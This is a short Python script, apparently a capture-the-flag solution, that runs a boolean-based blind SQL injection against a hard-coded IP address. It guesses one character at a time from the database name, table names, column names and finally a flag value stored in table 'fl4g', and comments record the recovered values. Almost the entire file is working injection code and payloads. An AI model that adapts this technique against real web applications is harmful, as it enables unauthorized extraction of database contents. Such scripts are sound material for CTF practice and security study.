# -*- coding:utf-8 -*-
import requests
import re

url = "http://120.24.86.145:8002/chengjidan/index.php"

base_payload = "1' and if(ascii(substr({data},{len},1))>{number},1,0)#" #if(prep1.prep2,prep3) 若表达式prep1为真，则返回prep2，若prep1为假，则返回prep3
#base_payload = "1' and if(ascii(substr(select table_name from information_schema.tables where table_name=database() limit 0,1)>{num},{len},1),1,0)#"
#payload = "database()" #skctf_flag 
#payload = "(select table_name from information_schema.tables where table_schema=database() limit 0,1)" #fl4g
#payload = "(select column_name from information_schema.columns where table_name='fl4g' limit 0,1)" #skctf_flag
payload = "(select skctf_flag from fl4g limit 0,1)"

information=""

for m in range(1,50):
    for i in range(32,129):
        post_data = {"id":base_payload.format(data = payload,len = m,number=i)}
        r = requests.post(url,post_data)
        resultarr = re.findall(r"<td>(.+?)<td>",r.text)
        result = ''.join(resultarr)
        #print result 
        #print r.text
        #print post_data
        if '60' not in result:
            information += chr(i)
            break
    print information